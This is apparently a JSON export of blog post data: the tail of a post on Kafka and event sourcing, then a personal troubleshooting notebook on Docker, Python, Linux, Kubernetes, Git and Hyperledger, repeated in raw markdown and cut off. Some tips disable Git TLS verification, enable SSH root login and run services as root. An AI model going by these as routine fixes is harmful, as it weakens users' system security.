ability to load the event stream for a specific entity. The common reason for this is to build a transient write model for the business logic to use to process the request. Doing this is impractical in Kafka. Using topic-per-entity could allow this, except this is a non-starter when there may be thousands or millions of that entity. This is due to technical limits in Kafka/Zookeeper. Using topic-per-type is recommended instead for Kafka, but this would require loading events for every entity of that type just to get events for a single entity. Since you cannot tell by log position which events belong to which entity. Even using Snapshots to start from a known log position, this could be a significant number of events to churn through. But snapshots cannot help you with code changes. Because adding new features to the business logic may render previous snapshots structurally incompatible. So it is still necessary to do a topic replay in those cases to build a new model. One of the main reasons to use a transient write model instead of a persisted one is to make business logic changes cheap and easy to deploy.</p>\n<ul>\n<li>Lack of conflict detection</li>\n</ul>\n<p>Secondly, users can create race conditions due to concurrent requests against the same entity. It may be quite undesirable to save conflicting events and resolve them after the fact. So it is important to be able to prevent conflicting events. To scale request load, it is common to use stateless services while preventing write conflicts using conditional writes (only write if the last entity event was #x). A.k.a. Optimistic Concurrency. Kafka does not support optimistic concurrency. Even if it supported it at the topic level, it would need to be all the way down to the entity level to be effective. To use Kafka and prevent conflicting events, you would need to use a stateful, serialized writer at the application level. This is a significant architectural requirement/restriction.</p>\n"},{"layout":"title","title":"Troubleshooting mixed","date":"2018-01-02T04:24:07.000Z","_content":"\nRecording some troubleshooting\n\n# Docker \nSome tips or little usage of docker \n\n1. how to shrink the docker logs\n    - `truncate -s 0 /var/lib/docker/containers/*/*-json.log` \n    - Though it works, but it still looks so terrible when your produced too many\n\n2. shadowsocks docker-compose:\n\n\n```\n---\nversion: \"3\"\n\nservices:\n\n  aes-256-cfb_ss:\n    image: mritd/shadowsocks\n    ports:\n      - 2333:8989\n    restart: always\n    command: -m \"ss-server\" -s \"-s 0.0.0.0 -p 8989 -m aes-256-cfb -k mypassword--fast-open\"\n```\n\n# netdata\n\nHere is the docker-compose file:\n\n```\nversion: '3'\n\nservices:\n  netdata:\n    image: netdata/netdata\n    volumes: \n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    restart: always\n    cap_add:\n      - SYS_PTRACE\n    security_opt:\n      - apparmor=unconfined\n    ports:\n      - 19999:19999\n\n```\n\n# Python snippets\n\n反转字符串：\n```\ndef main(word):\n    return ' '.join(word.split()[::-1])\nword = 'the sky is blue'\ninverse = main(word)\nprint(word)\nprint(inverse)\n```\n\n编辑距离\n```\nimport re\nfrom collections import Counter\n\nf = open(r'word_freq.txt', encoding='utf8')\nWORDS = {}\nid = 0\nfor line in f.readlines():\n    if id % 2 == 0:\n        word_freq = line.split('\\t')\n        WORDS[word_freq[0]] = int(word_freq[1])\n    id = id + 1\nletters = open(r'word.txt', encoding='utf8').read()\n\nN = sum(WORDS.values())\n\ndef P(word):\n    return WORDS[word] / N\n\ndef know(words):\n    return set(w for w in words if w in WORDS)\n\ndef edits1(word):\n    #letters = 'abcdefghijklmnopqrstuvwxyz'\n    splits = [(word[:i], word[i:]) for i in range(len(word) + 1)] #切分\n    deletes = [L + R[1:] for L, R in splits if R] #删除\n    transposes = [L + R[1] + R[0] + R[2:] for L, R in splits if len(R) > 1] #移位\n    replaces = [L + c + R[1:] for L, R in splits for c in letters] #代替\n    inserts = [L + c + R for L, R in splits for c in letters] #插入\n    return set(deletes + transposes + replaces + inserts)\n\ndef edits2(word):\n    return (e2 for e1 in edits1(word) for e2 in edits1(e1))\n\ndef candidates(word):\n    return (know([word]) or know(edits1(word)) or know(edits2(word)) or [word])\n\ndef correction(word):\n    return max(candidates(word), key=P)\n\nprint(correction('正分夺秒'))\n```\n\nLoad json file and write it for utf-8 format:\n\n```\nimport os\nimport json\nimport codecs\n\ndef write_json(output):\n    with codecs.open(\"config.json\", \"w\", 'utf-8') as file:\n        # using utf-8 and ensure_ascii for keep the formatting correct\n        file.write(json.dumps(output, ensure_ascii=False))\n\n\ndef load_json():\n    with open(\"template.json\") as file:\n        template = json.load(file)\n        output = template\n        write_json(output)\n```\n\n\nMerge dictionary:\n\n1. Using the method update()\nBy using the method update() in Python, one list can be merged into another. But in this, the second list is merged into the first list and no new list is created. It returns None.\nExample:\nPython code to merge dict using update() method\n\n```\ndef Merge(dict1, dict2):\n    return(dict2.update(dict1))\n\n\n# Driver code\ndict1 = {'a': 10, 'b': 8}\ndict2 = {'d': 6, 'c': 4}\n\n# This return None\nprint(Merge(dict1, dict2))\n\n# changes made in dict2\nprint(dict2)\n```\n\n2. Using ** in Python\n\nThis is generally considered a trick in Python where a single expression is used to merge two dictionaries and stored in a third dictionary. The single expression is **. This does not affect the other two dictionaries. ** implies that the argument is a dictionary. Using ** [double star] is a shortcut that allows you to pass multiple arguments to a function directly using a dictionary. For more information refer ** kwargs in Python. Using this we first pass all the elements of the first dictionary into the third one and then pass the second dictionary into the third. This will replace the duplicate keys of the first dictionary.\nExample:\nPython code to merge dict using a single\n\n```\ndef Merge(dict1, dict2):\n    res = {**dict1, **dict2}\n    return res\n\n\n# Driver code\ndict1 = {'a': 10, 'b': 8}\ndict2 = {'d': 6, 'c': 4}\ndict3 = Merge(dict1, dict2)\nprint(dict3)\n```\n### Use argparse.\n\nFor example, with test.py:\n```\nimport argparse\n\nparser=argparse.ArgumentParser(\n    description='''My Description. And what a lovely description it is. ''',\n    epilog=\"\"\"All's well that ends well.\"\"\")\nparser.add_argument('--foo', type=int, default=42, help='FOO!')\nparser.add_argument('bar', nargs='*', default=[1, 2, 3], help='BAR!')\nargs=parser.parse_args()\n```\nRunning\n\n`% test.py -h`\nyields\n```\nusage: test.py [-h] [--foo FOO] [bar [bar ...]]\n\nMy Description. And what a lovely description it is.\n\npositional arguments:\n  bar         BAR!\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --foo FOO   FOO!\n\nAll's well that ends well.\n```\n\n# Linux\n\n## What is sudo\n\nTo explain this you need to know what the programs do:\n\n`su` - The command `su` is used to switch to another user (**s** witch **u** ser), but you can also switch to the root user by invoking the command with no parameter. `su` asks you for the password of the user to switch, after typing the password you switched to the user's environment.     \n\n`sudo` - `sudo` is meant to run a single command with root privileges. But unlike `su` it prompts you for the password of the current user. This user must be in the sudoers file (or a group that is in the sudoers file). By default, Ubuntu \"remembers\" your password for 15 minutes, so that you don't have to type your password every time.\n\n`bash` - A text-interface to interact with the computer. It's important to understand the difference between login, non-login, interactive and non-interactive shells:\n\n- login shell: A login shell logs you into the system as a specified user, necessary for this is a username and password. When you hit <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>F1</kbd> to login into a virtual terminal you get after successful login a login shell.\n- non-login shell: A shell that is executed without logging in, necessary for this is a currently logged-in user. When you open a graphic terminal in gnome it is a non-login shell.\n- interactive shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal.\n- non-interactive shell: A (sub)shell that is probably run from an automated process. You will see neither input nor output.\n\n\n**`sudo su`** Calls `sudo` with the command `su`. Bash is called as interactive non-login shell. So bash only executes `.bashrc`. You can see that after switching to root you are still in the same directory:\n\n    user@host:~$ sudo su\n    root@host:/home/user#\n\n**`sudo su -`** This time it is a login shell, so `/etc/profile`, `.profile` and `.bashrc` are executed and you will find yourself in root's home directory with root's environment.\n\n**`sudo -i`** It is nearly the same as `sudo su -` The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that login-specific resource files such as `.profile`, `.bashrc` or `.login` will be read and executed by the shell.\n\n**`sudo /bin/bash`** This means that you call `sudo` with the command `/bin/bash`. `/bin/bash` is started as non-login shell so all the dot-files are not executed, but bash itself reads `.bashrc` of the calling user. Your environment stays the same. Your home will not be root's home. So you are root, but in the environment of the calling user.\n\n**`sudo -s`** reads the `$SHELL` variable and executes the content. If `$SHELL` contains `/bin/bash` it invokes `sudo /bin/bash` (see above).\n\n\n**Check:**\nTo check if you are in a login shell or not (works only in bash because `shopt` is a builtin command):\n\n    shopt -q login_shell && echo 'Login shell' || echo 'No login shell'\n\n\n\n### Referencing \n- https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used\n\n### To enable root login in ubuntu: \n\nset `/etc/ssh/sshd_config`:\n```\nPermitRootLogin yes\n```\n\n# Jupyter notebook\n\n[Official Guild](https://jupyter-notebook.readthedocs.io/en/stable/public_server.html)\n\n[Running as a daemon](https://stackoverflow.com/questions/14297741/how-to-start-ipython-notebook-server-at-boot-as-daemon)\n\nIf you are using Anaconda integrated jupyter-notebook, using `which jupyter-notebook` to find the place that jupyter located.\n\nThen add this to `/usr/lib/systemd/system/jupyter.service`\n\n```\n[Unit]\nDescription=Jupyter Notebook\n\n[Service]\nType=simple\nPIDFile=/run/jupyter.pid\nExecStart=/root/anaconda3/bin/jupyter-notebook --config=/root/.jupyter/jupyter_notebook_config.py --allow-root\nUser=jupyter\nGroup=jupyter\nWorkingDirectory=/root\nRestart=always\nRestartSec=10\n#KillMode=mixed\n\n[Install]\nWantedBy=multi-user.target\n```\n\nSometimes it will faild by the Permission or config issues, using the following method to solve it.\n\n- add `--allow-root` in the end of the ExecStart command\n- remove `User` or `Group` on `[Service]` Option\n- add `/bin/bash -c ` in the head of the ExecStart\n\n\n# Windows\n\nWhen I transfer my development environment from OSX to Windows, due to the stipulation, I stuffered a lot because of the notorious unfriendly dev-env of windows.\n1. Unable to create any file or folder. Even though I reset the Security on the Properties on the Disk to full control. \n    - Finally I figured out some sorfware or my slip to create redgit lose. \n    - use win + R to open regdit\n    - Go into `HKEY_CLASSES_ROOT\\Directory\\Background\\shellex\\ContextMenuHandlers\\`\n    - Later I will find there only two option in the Context Menu Handlers. That's werid.\n    - If New folder exists, edits the New option and modify the Value to `{D969A300-E7FF-11d0-A93B-00A0C90F2719}`\n    - If it not exists, create one and fill the Value as I mentioned above.\n    \n\n# Node.js\n1. Though there are planty of method to deal with the callback machinism, still too many people, especially who have been learning static type language with no rudimentary of asynchronous programming experience, cannot be capable of adapting subversion coding style.\n2. So I am about to record some trouble when I learning node.js or typescripts or other javascripts-like stuff as a `story`.\n3. When I use vscode to write node.js, more specifically, to write javascript style language, like typescript.\n    - but when I use `buffer` type on typescript, there are always pop up a red dot which notice me `[ts] cannot find name 'buffer'`. That's weird since buffer is a normal variable type in the most programming language, so is it in typescript. However, it still annoying me. \n    - Here is the conclusion: some node environmnet types are needed when use typescript, for some types are not embeded in typescript. For this limitation, we might be able to get around by stubbing those interfaces in the future. \n    - I admit it's odd to have to include node typing for a fornt-end project, but when I try install the envrionmetn typeings to see if it gets around on my issues. It workd for now. \n    - `npm install --save-deve @types/node`\n4. This day, I try to use RocketMQ to build a connection between nodejs and Java, nothing happends... \n5. When I using npm install to install grpc, processes stucked in `node-pre-gyp install --fallback-to-build --library=static_library`. Waiting over than 1 hours or more still cannot finished that course. Besides, when I checked the cpu usage of the machine, it seems that all the processers are running in low load, which means that the machine works fine. Now that the trouble must caused by the npm. It looks like shortage of some optional package which makes the process stagged. \n    - using `yum install -y node-gyp` to install the node-pre-gyp or somethings else(I am not sure what it is. But when all installation stuff done, then the npm install going smoothly without any hitch). It is normal when the npm install slow down or even unresponsive when `node-pre-grp install`, after all the build progress consume some system resources.\n6. running command with nodejs: https://stackoverflow.com/questions/20643470/execute-a-command-line-binary-with-node-js?answertab=votes#tab-top\n\n# Kubernetes\n1. when you have already installed docker-ce or other docker toolkit, you may come into installation conflict unless you choose other installation method instead of using package management tool like `yum/apt/...`. \n    - otherwise, you should uninstall the old version of docker, then run `yum install -y etcd kubernetes`\n2. when I using pod deployment to run a hello-world cluster, I found that k8s can not let the container running and unable to create replication. \n    - Use `kubectl describe pods` to get more information. Scrolling down to the last line, I saw that it's going to readhat.com and failing. Why it's using RedHat repo？ Did it should pull from the docker hub?\n\n    ```\n    Error syncing pod, skipping: failed to \"StartContainer\" for \"POD\" with ErrImagePull: \"image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (open /etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt: no such file or directory)\"\n\n    ```\n    \n    - using `yum install -y subscription-manager rhsm` to help the k8s pull from the right place\n    - But unfortunately, I failed to install both rhsm and subscription. In fact, rhsm has been replace by RedHat's subscription-manager. It cannot works for my machine, yet subscription-manager installed successfuly.\n    - So I have to search the old version of rhsm and then use rpm installation tool to force my systemd to use rhsm.\n    - Here is the package download address: \n    - https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm\n    - https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-1.19.10-1.el7_4.x86_64.rpm\n    - Both rhsm and certificate should installed in order, the rhsm is rely on the certificate tool. \n    - Make sure you download the two package on the same folder and use `rpm -ivh python-rhsm-*.rpm` to keep the installation in order.\n\n3. After I deal with the rhsm ERROR, kubernetes throw up another problem immediately to me, compelling me to keep dive into the OPS stuff with unprepared technology experience. \n\n    ```\n    image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (net/http: request canceled)\n    ```\n    \n    - As plain as on the screen, kubernetes cannot interactive docker to pull a image from hub. Most of the solution that I used for settle is using the proxy(To bypass the GWF).\n    - Using `docker pull registry.access.redhat.com/rhel7/pod-infrastructure:latest`, it looks good to me.\n\n4. If you choose `hostpath` as your presistentVolume, you can only use `ReadWriteOnce` for single node, since you developments environment is single node.\n\n5. And if you create a service without defining a selector as in a yaml file, like most people do in case to select the pods, endpoints will not be create. But, fortunatly, kubernetes offers a alternative way to make sure you container, which deployed in some specific pods, to communicate with other exogenous container. \n    - declaring another kind as endpoints, as you can noticed when you use `kubectl get endpoints`, which endpoints defined as a permanent word in kubetctl, to create a type of component, with setting some propetries.\n    - when it comes to the imperative complexity, multiple ports is be requisted in many services deployment. As defined in whether kubernetes or any network policy, exposing more than one port is necessary. Kubernetes supports multiple port definitions on a Service object. Resulting from that predefined statements, when using multiple ports you must give all of your ports names, so that endpoints can be disambiguated.  \n    - Endpoint will not be alloted unless the pods be created.\n\n6. helm init failure becuase of the image pulling crash. So I need to setting a docker-proxy and daemon-reload/restart docker to pull the images again.\n7. Though helm init successfully when image has been pulled, helm still cannot connect to the kubernetes api server. It shows:\n    ```\n    Error: Get http://localhost:8080/api/v1/namespaces/kube-system/configmaps?labelSelector=OWNER%!D(MISSING)TILLER: dial tcp [::1]:8080: connect: connection refused\n    ```\n    - It seems that the tiller pod in kubernetes cannot connect to the api servier cause lack of HOST or DNS. \n    - Using `docker exec -it container_ip env` to get the environment variable to check whether the KUBERNETES_SERVICE_HOST exists. Then I got the 10.254.0.1, it looks like the default kuberentes service IP\n8. In the Great China, most of the Internet stuff about the goolge cannot be accessible. But some tech company are willing to help other programmer to get access google cloud, npm and any repo which is blocked in the outside of the GWF. It is the same as the helm. The final solution for me is installing an aliyun version of helm to get to start the tiller. Also, don't forget to get the right version matching between client and server.\n    ```\n    helm init --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1 --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts\nkubectl create serviceaccount --namespace kube-system tiller\nkubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller\nkubectl patch deploy --namespace kube-system tiller-deploy -p '{\"spec\":{\"template\":{\"spec\":{\"serviceAccount\":\"tiller\"}}}}'\n    ```\n\n9. Noticed that when I using 2.10 version of helm, there is an gorouting error happend by typing `helm ls`\n\n    ```\n    panic: runtime error: invalid memory address or nil pointer dereference [signal SIGSEGV: segmentation violation code=0x1 addr=0x30 pc=0x1276506] tiller\n    ```\n    - That is a dev bug undering the development of the helm.\n    - downupgrde you helm to 2.9.1 will be fine.\n\n# Git\n1. `Encountered end of file`\n    - Add $GIT_CURL_VERBOSE=1 can solved that problem \n2. Still be annoied by the useless private gitlab server, problem comes one by one without any obviating indication. \n    - `Peer's Certificate issuer is not recognized.`\n    - two solutions, the first one is setting GIS_SSL_NO_VERIFY environment parametes to true\n    - the another one is using `git config --global http.sslVerify false` to solving the config missing\n3. git can not clone a repo from a unsafe link \n    ```\n    fatal: unable to access 'https://***.git/': SSL certificate problem: self signed certificate\n    ```\n\n    - solution: add a environment in the front of you command:\n    - GIT_SSL_NO_VERIFY=true git clone ****\n4. what if you used a Github account on your mac before but now your changed your account?\n\nTry remove your account:\n\n```\n$ git credential-osxkeychain erase\nhost=github.com\nprotocol=https\n[Press Return]\n```\nand using `git push`  or whatever the command to handle git and login your git account again.\n\n# Hyperledger Fabric\n1. `Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host`\n    - Small fix difícil de conseguir para Hyperledger Fabric 1.1.0 corriendo en Docker Swarm. Multiples organizations corriendo en un mismo host:\n    ```\n    createChaincodeServer -> ERRO 02a Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host\n\n    Resulta que para la versión 1.1.0 de HLF se requiere incluir esta propiedad en el environment section del docker-compose.yaml de los peers:\n\n    CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0:7052\n    ```\n\n2. `Error: Error: Calling enrollment endpoint failed with error [Error: read ECONNRESET]`\n    - When I try to monitor a event hub for chaincode calling in node SDK, some error throw up after I use my own script to create channel, join, and other stuff. \n    - The weird things is that, checking the ca container looks good to me. Then I recalled that if it is my fault that not to add remove temp file cache in scripts. So I rechecked it again, however, I cleared the cache. \n    - How can this happend without any change I did to the server. So I debug my script by line: after I started up the network, I did other channel stuff in few seconds. It surprised me that the log did not throw the error mentioned above. \n    - It turns out that I can create the channel immediately when I started up the docker-compose.\n    - Add sleep 5 to the scripts will be fine.\n\n3. `Promise is rejected: Error: 2 UNKNOWN: access denied: channel [mychannel] creator org [Org1MSP]`\n    - orgpeercan not be found in channel\n4. `error executing chaincode: failed to execute transaction: timeout expired while executing transaction`\nProbably because of the chaincode is not installed perfectly","source":"_posts/Troubleshooting.md","raw":"---\nlayout: title\ntitle: Troubleshooting mixed\ndate: 2018-01-01 22:24:07\ntags: troubleshooting\ncategories: Tech\n---\n\nRecording some troubleshooting\n\n# Docker \nSome tips or little usage of docker \n\n1. how to shrink the docker logs\n    - `truncate -s 0 /var/lib/docker/containers/*/*-json.log` \n    - Though it works, but it still looks so terrible when your produced too many\n\n2. shadowsocks docker-compose:\n\n\n```\n---\nversion: \"3\"\n\nservices:\n\n  aes-256-cfb_ss:\n    image: mritd/shadowsocks\n    ports:\n      - 2333:8989\n    restart: always\n    command: -m \"ss-server\" -s \"-s 0.0.0.0 -p 8989 -m aes-256-cfb -k mypassword--fast-open\"\n```\n\n# netdata\n\nHere is the docker-compose file:\n\n```\nversion: '3'\n\nservices:\n  netdata:\n    image: netdata/netdata\n    volumes: \n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    restart: always\n    cap_add:\n      - SYS_PTRACE\n    security_opt:\n      - apparmor=unconfined\n    ports:\n      - 19999:19999\n\n```\n\n# Python snippets\n\n反转字符串：\n```\ndef main(word):\n    return ' '.join(word.split()[::-1])\nword = 'the sky is blue'\ninverse = main(word)\nprint(word)\nprint(inverse)\n```\n\n编辑距离\n```\nimport re\nfrom collections import Counter\n\nf = open(r'word_freq.txt', encoding='utf8')\nWORDS = {}\nid = 0\nfor line in f.readlines():\n    if id % 2 == 0:\n        word_freq = line.split('\\t')\n        WORDS[word_freq[0]] = int(word_freq[1])\n    id = id + 1\nletters = open(r'word.txt', encoding='utf8').read()\n\nN = sum(WORDS.values())\n\ndef P(word):\n    return WORDS[word] / N\n\ndef know(words):\n    return set(w for w in words if w in WORDS)\n\ndef edits1(word):\n    #letters = 'abcdefghijklmnopqrstuvwxyz'\n    splits = [(word[:i], word[i:]) for i in range(len(word) + 1)] #切分\n    deletes = [L + R[1:] for L, R in splits if R] #删除\n    transposes = [L + R[1] + R[0] + R[2:] for L, R in splits if len(R) > 1] #移位\n    replaces = [L + c + R[1:] for L, R in splits for c in letters] #代替\n    inserts = [L + c + R for L, R in splits for c in letters] #插入\n    return set(deletes + transposes + replaces + inserts)\n\ndef edits2(word):\n    return (e2 for e1 in edits1(word) for e2 in edits1(e1))\n\ndef candidates(word):\n    return (know([word]) or know(edits1(word)) or know(edits2(word)) or [word])\n\ndef correction(word):\n    return max(candidates(word), key=P)\n\nprint(correction('正分夺秒'))\n```\n\nLoad json file and write it for utf-8 format:\n\n```\nimport os\nimport json\nimport codecs\n\ndef write_json(output):\n    with codecs.open(\"config.json\", \"w\", 'utf-8') as file:\n        # using utf-8 and ensure_ascii for keep the formatting correct\n        file.write(json.dumps(output, ensure_ascii=False))\n\n\ndef load_json():\n    with open(\"template.json\") as file:\n        template = json.load(file)\n        output = template\n        write_json(output)\n```\n\n\nMerge dictionary:\n\n1. Using the method update()\nBy using the method update() in Python, one list can be merged into another. But in this, the second list is merged into the first list and no new list is created. It returns None.\nExample:\nPython code to merge dict using update() method\n\n```\ndef Merge(dict1, dict2):\n    return(dict2.update(dict1))\n\n\n# Driver code\ndict1 = {'a': 10, 'b': 8}\ndict2 = {'d': 6, 'c': 4}\n\n# This return None\nprint(Merge(dict1, dict2))\n\n# changes made in dict2\nprint(dict2)\n```\n\n2. Using ** in Python\n\nThis is generally considered a trick in Python where a single expression is used to merge two dictionaries and stored in a third dictionary. The single expression is **. This does not affect the other two dictionaries. ** implies that the argument is a dictionary. Using ** [double star] is a shortcut that allows you to pass multiple arguments to a function directly using a dictionary. For more information refer ** kwargs in Python. Using this we first pass all the elements of the first dictionary into the third one and then pass the second dictionary into the third. This will replace the duplicate keys of the first dictionary.\nExample:\nPython code to merge dict using a single\n\n```\ndef Merge(dict1, dict2):\n    res = {**dict1, **dict2}\n    return res\n\n\n# Driver code\ndict1 = {'a': 10, 'b': 8}\ndict2 = {'d': 6, 'c': 4}\ndict3 = Merge(dict1, dict2)\nprint(dict3)\n```\n### Use argparse.\n\nFor example, with test.py:\n```\nimport argparse\n\nparser=argparse.ArgumentParser(\n    description='''My Description. And what a lovely description it is. ''',\n    epilog=\"\"\"All's well that ends well.\"\"\")\nparser.add_argument('--foo', type=int, default=42, help='FOO!')\nparser.add_argument('bar', nargs='*', default=[1, 2, 3], help='BAR!')\nargs=parser.parse_args()\n```\nRunning\n\n`% test.py -h`\nyields\n```\nusage: test.py [-h] [--foo FOO] [bar [bar ...]]\n\nMy Description. And what a lovely description it is.\n\npositional arguments:\n  bar         BAR!\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --foo FOO   FOO!\n\nAll's well that ends well.\n```\n\n# Linux\n\n## What is sudo\n\nTo explain this you need to know what the programs do:\n\n`su` - The command `su` is used to switch to another user (**s** witch **u** ser), but you can also switch to the root user by invoking the command with no parameter. `su` asks you for the password of the user to switch, after typing the password you switched to the user's environment.     \n\n`sudo` - `sudo` is meant to run a single command with root privileges. But unlike `su` it prompts you for the password of the current user. This user must be in the sudoers file (or a group that is in the sudoers file). By default, Ubuntu \"remembers\" your password for 15 minutes, so that you don't have to type your password every time.\n\n`bash` - A text-interface to interact with the computer. It's important to understand the difference between login, non-login, interactive and non-interactive shells:\n\n- login shell: A login shell logs you into the system as a specified user, necessary for this is a username and password. When you hit <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>F1</kbd> to login into a virtual terminal you get after successful login a login shell.\n- non-login shell: A shell that is executed without logging in, necessary for this is a currently logged-in user. When you open a graphic terminal in gnome it is a non-login shell.\n- interactive shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal.\n- non-interactive shell: A (sub)shell that is probably run from an automated process. You will see neither input nor output.\n\n\n**`sudo su`** Calls `sudo` with the command `su`. Bash is called as interactive non-login shell. So bash only executes `.bashrc`. You can see that after switching to root you are still in the same directory:\n\n    user@host:~$ sudo su\n    root@host:/home/user#\n\n**`sudo su -`** This time it is a login shell, so `/etc/profile`, `.profile` and `.bashrc` are executed and you will find yourself in root's home directory with root's environment.\n\n**`sudo -i`** It is nearly the same as `sudo su -` The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that login-specific resource files such as `.profile`, `.bashrc` or `.login` will be read and executed by the shell.\n\n**`sudo /bin/bash`** This means that you call `sudo` with the command `/bin/bash`. `/bin/bash` is started as non-login shell so all the dot-files are not executed, but bash itself reads `.bashrc` of the calling user. Your environment stays the same. Your home will not be root's home. So you are root, but in the environment of the calling user.\n\n**`sudo -s`** reads the `$SHELL` variable and executes the content. If `$SHELL` contains `/bin/bash` it invokes `sudo /bin/bash` (see above).\n\n\n**Check:**\nTo check if you are in a login shell or not (works only in bash because `shopt` is a builtin command):\n\n    shopt -q login_shell && echo 'Login shell' || echo 'No login shell'\n\n\n\n### Referencing \n- https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used\n\n### To enable root login in ubuntu: \n\nset `/etc/ssh/sshd_config`:\n```\nPermitRootLogin yes\n```\n\n# Jupyter notebook\n\n[Official Guild](https://jupyter-notebook.readthedocs.io/en/stable/public_server.html)\n\n[Running as a daemon](https://stackoverflow.com/questions/14297741/how-to-start-ipython-notebook-server-at-boot-as-daemon)\n\nIf you are using Anaconda integrated jupyter-notebook, using `which jupyter-notebook` to find the place that jupyter located.\n\nThen add this to `/usr/lib/systemd/system/jupyter.service`\n\n```\n[Unit]\nDescription=Jupyter Notebook\n\n[Service]\nType=simple\nPIDFile=/run/jupyter.pid\nExecStart=/root/anaconda3/bin/jupyter-notebook --config=/root/.jupyter/jupyter_notebook_config.py --allow-root\nUser=jupyter\nGroup=jupyter\nWorkingDirectory=/root\nRestart=always\nRestartSec=10\n#KillMode=mixed\n\n[Install]\nWantedBy=multi-user.target\n```\n\nSometimes it will faild by the Permission or config issues, using the following method to solve it.\n\n- add `--allow-root` in the end of the ExecStart command\n- remove `User` or `Group` on `[Service]` Option\n- add `/bin/bash -c ` in the head of the ExecStart\n\n\n# Windows\n\nWhen I transfer my development environment from OSX to Windows, due to the stipulation, I stuffered a lot because of the notorious unfriendly dev-env of windows.\n1. Unable to create any file or folder. Even though I reset the Security on the Properties on the Disk to full control. \n    - Finally I figured out some sorfware or my slip to create redgit lose. \n    - use win + R to open regdit\n    - Go into `HKEY_CLASSES_ROOT\\Directory\\Background\\shellex\\ContextMenuHandlers\\`\n    - Later I will find there only two option in the Context Menu Handlers. That's werid.\n    - If New folder exists, edits the New option and modify the Value to `{D969A300-E7FF-11d0-A93B-00A0C90F2719}`\n    - If it not exists, create one and fill the Value as I mentioned above.\n    \n\n# Node.js\n1. Though there are planty of method to deal with the callback machinism, still too many people, especially who have been learning static type language with no rudimentary of asynchronous programming experience, cannot be capable of adapting subversion coding style.\n2. So I am about to record some trouble when I learning node.js or typescripts or other javascripts-like stuff as a `story`.\n3. When I use vscode to write node.js, more specifically, to write javascript style language, like typescript.\n    - but when I use `buffer` type on typescript, there are always pop up a red dot which notice me `[ts] cannot find name 'buffer'`. That's weird since buffer is a normal variable type in the most programming language, so is it in typescript. However, it still annoying me. \n    - Here is the conclusion: some node environmnet types are needed when use typescript, for some types are not embeded in typescript. For this limitation, we might be able to get around by stubbing those interfaces in the future. \n    - I admit it's odd to have to include node typing for a fornt-end project, but when I try install the envrionmetn typeings to see if it gets around on my issues. It workd for now. \n    - `npm install --save-deve @types/node`\n4. This day, I try to use RocketMQ to build a connection between nodejs and Java, nothing happends... \n5. When I using npm install to install grpc, processes stucked in `node-pre-gyp install --fallback-to-build --library=static_library`. Waiting over than 1 hours or more still cannot finished that course. Besides, when I checked the cpu usage of the machine, it seems that all the processers are running in low load, which means that the machine works fine. Now that the trouble must caused by the npm. It looks like shortage of some optional package which makes the process stagged. \n    - using `yum install -y node-gyp` to install the node-pre-gyp or somethings else(I am not sure what it is. But when all installation stuff done, then the npm install going smoothly without any hitch). It is normal when the npm install slow down or even unresponsive when `node-pre-grp install`, after all the build progress consume some system resources.\n6. running command with nodejs: https://stackoverflow.com/questions/20643470/execute-a-command-line-binary-with-node-js?answertab=votes#tab-top\n\n# Kubernetes\n1. when you have already installed docker-ce or other docker toolkit, you may come into installation conflict unless you choose other installation method instead of using package management tool like `yum/apt/...`. \n    - otherwise, you should uninstall the old version of docker, then run `yum install -y etcd kubernetes`\n2. when I using pod deployment to run a hello-world cluster, I found that k8s can not let the container running and unable to create replication. \n    - Use `kubectl describe pods` to get more information. Scrolling down to the last line, I saw that it's going to readhat.com and failing. Why it's using RedHat repo？ Did it should pull from the docker hub?\n\n    ```\n    Error syncing pod, skipping: failed to \"StartContainer\" for \"POD\" with ErrImagePull: \"image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (open /etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt: no such file or directory)\"\n\n    ```\n    \n    - using `yum install -y subscription-manager rhsm` to help the k8s pull from the right place\n    - But unfortunately, I failed to install both rhsm and subscription. In fact, rhsm has been replace by RedHat's subscription-manager. It cannot works for my machine, yet subscription-manager installed successfuly.\n    - So I have to search the old version of rhsm and then use rpm installation tool to force my systemd to use rhsm.\n    - Here is the package download address: \n    - https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm\n    - https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-1.19.10-1.el7_4.x86_64.rpm\n    - Both rhsm and certificate should installed in order, the rhsm is rely on the certificate tool. \n    - Make sure you download the two package on the same folder and use `rpm -ivh python-rhsm-*.rpm` to keep the installation in order.\n\n3. After I deal with the rhsm ERROR, kubernetes throw up another problem immediately to me, compelling me to keep dive into the OPS stuff with unprepared technology experience. \n\n    ```\n    image 